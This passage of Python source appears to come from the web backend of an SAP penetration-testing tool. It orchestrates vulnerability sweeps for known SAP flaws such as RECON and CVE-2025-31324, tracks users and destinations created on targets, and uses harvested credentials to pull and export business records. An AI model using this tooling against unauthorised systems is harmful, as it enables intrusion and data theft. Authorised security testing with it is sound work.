                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 5. SAProuter info leak — SAProuter nodes only
                if is_router:
                    try:
                        from sap_router_info import saprouter_info_request
                        host = node.ip or node.hostname
                        if host:
                            router_port = 3299
                            for inst in node.instances:
                                for port, svc in inst.ports.items():
                                    if svc == "saprouter":
                                        router_port = port
                                        break
                            print(f"[*] {node.sid}: check_router_info "
                                  f"({host}:{router_port})")
                            node.saprouter_info = saprouter_info_request(
                                host, router_port, timeout=10)
                            if node.saprouter_info.get("vulnerable"):
                                node.has_critical_finding = True
                    except Exception as e:
                        print(f"[-] {node.sid}: check_router_info failed: {e}")

            vulns = []
            for n in nodes:
                hits = []
                if n.gw_vulnerable: hits.append("GW")
                if n.ms_vulnerable: hits.append("10KBlaze")
                if getattr(n, "cve_2025_31324_vulnerable", False):
                    hits.append("CVE-2025-31324")
                if getattr(n, "cve_2020_6287_vulnerable", False):
                    hits.append("RECON")
                if (getattr(n, "saprouter_info", None)
                        and n.saprouter_info.get("vulnerable")):
                    hits.append("Router-InfoLeak")
                if hits:
                    vulns.append(f"{n.sid}: {', '.join(hits)}")
            print(f"[+] Vuln sweep complete — {len(vulns)} system(s) with findings")
            for v in vulns:
                print(f"    {v}")

        _bg("_check_all_vulns", "Scan for All Vulnerabilities", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/created_users")
    def actions_created_users():
        response.content_type = "application/json"
        users = sapmap_cleanup.list_created_users(api.state)
        return json.dumps({"users": users})

    @app.route("/api/actions/created_destinations")
    def actions_created_destinations():
        response.content_type = "application/json"
        return json.dumps({"destinations": api.state.created_destinations})

    @app.route("/api/actions/clear_created_destinations", method="POST")
    def actions_clear_created_destinations():
        response.content_type = "application/json"
        state_mgr.clear_created_destinations(api.state)
        return json.dumps({"status": "ok"})

    # -- State save/load --
    @app.route("/api/state/save", method="POST")
    def api_state_save():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            filepath = state_mgr.auto_save_path()
        else:
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        try:
            state_mgr.save_state(api.state, filepath)
            return json.dumps({"status": "ok", "path": filepath})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/load", method="POST")
    def api_state_load():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            return json.dumps({"error": "No file specified"})

        # Try as absolute path, then relative to states dir
        filepath = name
        if not os.path.isabs(filepath):
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        if not filepath.endswith(".sapmap") and not filepath.endswith(".json"):
            filepath += ".sapmap"

        try:
            api.state = state_mgr.load_state(filepath)
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/upload", method="POST")
    def api_state_upload():
        """Load state from an uploaded file (browser file picker)."""
        response.content_type = "application/json"
        try:
            data = request.json
            if not data:
                return json.dumps({"error": "No data received"})
            api.state = SAPMAPState.from_dict(data)
            if isinstance(data, dict) and data.get("_findings"):
                try:
                    sapmap_findings.load_snapshot(data["_findings"])
                except Exception:
                    pass
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    # -- Business Impact Assessment --
    @app.route("/api/node/<sid>/impact/assess", method="POST")
    def node_impact_assess(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        scenario = data.get("scenario")  # None = run all
        client = data.get("client")      # None = best_credentials

        def _run():
            if client:
                # Find credentials matching the requested client
                creds = None
                for cu in node.created_users:
                    if cu.client == client:
                        creds = Credentials(username=cu.username, password=cu.password,
                                            client=cu.client, instance_nr=cu.instance_nr,
                                            verified=True)
                        break
                if not creds:
                    for c in node.credentials:
                        if c.client == client:
                            creds = c
                            break
                if not creds:
                    # Fallback: use best_credentials and override client
                    creds = node.best_credentials()
                    if creds:
                        creds = Credentials(username=creds.username,
                                            password=creds.password,
                                            client=client,
                                            instance_nr=creds.instance_nr,
                                            verified=creds.verified)
            else:
                creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            import sapmap_impact
            # Map impact Severity.value (1..5) → findings bus severity.
            # Only scenarios that actually returned data (record_count>0)
            # are worth surfacing — empty reads are just noise.
            def _sev_for(sev_value: int) -> str:
                if sev_value >= 5: return "CRITICAL"
                if sev_value == 4: return "HIGH"
                if sev_value == 3: return "MEDIUM"
                return "INFO"

            if scenario:
                print(f"[*] {sid}: Running impact scenario '{scenario}'...")
                r = sapmap_impact.assess_one(node, creds, scenario)
                if r:
                    # Replace or append
                    node.impact_results = [
                        ir for ir in node.impact_results
                        if ir.get("scenario") != scenario
                    ]
                    node.impact_results.append(r.to_dict())
                    print(f"  [{r.severity_label}] {r.headline}")
                    if r.record_count > 0 and not r.error:
                        sapmap_findings.emit_finding(
                            _sev_for(r.severity.value), sid,
                            f"Business impact [{r.scenario}]: {r.headline} "
                            f"({r.record_count} record(s))",
                        )
            else:
                print(f"[*] {sid}: Running all business impact scenarios...")
                results = sapmap_impact.assess_all(node, creds)
                node.impact_results = [r.to_dict() for r in results]
                crit = sum(1 for r in results if r.severity.value >= 5)
                high = sum(1 for r in results if r.severity.value == 4)
                total = len([r for r in results if r.record_count > 0])
                print(f"[+] {sid}: {total} impact scenarios with data "
                      f"({crit} critical, {high} high)")
                # Per-scenario finding for each hit so the drawer gets
                # full detail; plus a single roll-up row so the banner
                # shows the headline count without 20 slide-ins.
                for r in results:
                    if r.record_count > 0 and not r.error:
                        sapmap_findings.emit_finding(
                            _sev_for(r.severity.value), sid,
                            f"Business impact [{r.scenario}]: {r.headline} "
                            f"({r.record_count} record(s))",
                        )
                if total > 0:
                    roll_sev = "CRITICAL" if crit else ("HIGH" if high
                                                         else "MEDIUM")
                    sapmap_findings.emit_finding(
                        roll_sev, sid,
                        f"Business-impact assessment: {total} scenario(s) "
                        f"returned data ({crit} critical, {high} high)",
                    )

        _bg(f"{sid}:impact", "Business Impact Assessment", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/impact")
    def node_impact_get(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        return json.dumps({
            "sid": sid,
            "results": node.impact_results,
        })

    # Two routes for the same handler — the path-style accepts the
    # scenario name as a positional segment (legacy ABAP scenarios with
    # short alphanumeric names), the query-style accepts it as ?scenario=
    # so names containing characters Bottle's <name> placeholder rejects
    # (slashes and spaces in Java scenario names like "PI/PO Message
    # Tampering") still work.
    @app.route("/api/node/<sid>/impact/export")
    def node_impact_export_query(sid):
        return _node_impact_export(sid, request.params.get("scenario", ""))

    @app.route("/api/node/<sid>/impact/export/<scenario_name>")
    def node_impact_export_path(sid, scenario_name):
        return _node_impact_export(sid, scenario_name)

    def _node_impact_export(sid, scenario_name):
        response.content_type = "application/json"
        if not scenario_name:
            return json.dumps({"error": "scenario name is required"})
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        # 1. Try the cached results on the node first.  Java impact
        #    scenarios are probe-only (no creds + no re-run path), and
        #    even for ABAP this avoids a duplicate RFC round trip when
        #    we already have the data.
        cached = next(
            (r for r in (node.impact_results or [])
             if r.get("scenario") == scenario_name),
            None,
        )

        records = []
        if cached and cached.get("sample_records"):
            records = cached["sample_records"]
        else:
            # 2. Fallback: re-run the ABAP scenario via RFC.  Only
            #    available when ABAP credentials exist on the node.
            import sapmap_impact
            creds = node.best_credentials()
            if not creds:
                return json.dumps({
                    "error": "No cached records for this scenario "
                             "and no credentials available to re-run"
                })
            try:
                result = sapmap_impact.assess_one(node, creds, scenario_name)
            except Exception as e:
                return json.dumps({"error": f"Query failed: {e}"})
            if not result or not result.sample_records:
                return json.dumps({"error": "No data for this scenario"})
            records = result.sample_records

        # Normalise the row shape: dict (ABAP) → multi-column CSV,
        # plain string (Java) → single-column CSV with header "evidence".
        import io, csv
        buf = io.StringIO()
        if records and isinstance(records[0], dict):
            columns = [c for c in records[0].keys()
                        if not isinstance(records[0].get(c), (list, dict))]
            writer = csv.DictWriter(buf, fieldnames=columns,
                                      extrasaction="ignore")
            writer.writeheader()
            for row in records:
                writer.writerow({k: row.get(k, "") for k in columns})
        else:
            writer = csv.writer(buf)
            writer.writerow(["evidence"])
            for row in records:
                writer.writerow([str(row)])

        # Save to states/ folder
        import sapmap_state
        os.makedirs(sapmap_state.STATE_DIR, exist_ok=True)
        # Sanitise the scenario name for the filename — slashes and
        # spaces would otherwise produce invalid paths.
        import re as _re
        safe_scn = _re.sub(r"[^A-Za-z0-9._-]+", "_", scenario_name)
        filename = f"{sid}_{safe_scn}.csv"
        filepath = os.path.join(sapmap_state.STATE_DIR, filename)
        with open(filepath, "w", newline="") as f:
            f.write(buf.getvalue())

        print(f"[+] Exported {len(records)} records to {filepath}")
        return json.dumps({
            "status": "ok",
            "file": filepath,
            "records": len(records),
            "filename": filename,
        })

    @app.route("/api/local_ip")
    def local_ip():
        response.content_type = "application/json"
        import socket as _sock
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            ip = s.getsockname()[0]
            s.close()
        except Exception:
            ip = ""
        return json.dumps({"ip": ip})

    @app.route("/api/impact/scenarios")
    def impact_scenarios():
        response.content_type = "application/json"
        import sapmap_impact
        return json.dumps(sapmap_impact.list_scenarios())

    # -- Export --
    @app.route("/api/export/json")
    def export_json():
        response.content_type = "application/json"
        response.headers["Content-Disposition"] = (
            f'attachment; filename="sapmap_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json"'
        )
        return api.state.to_json(indent=2)

    return app
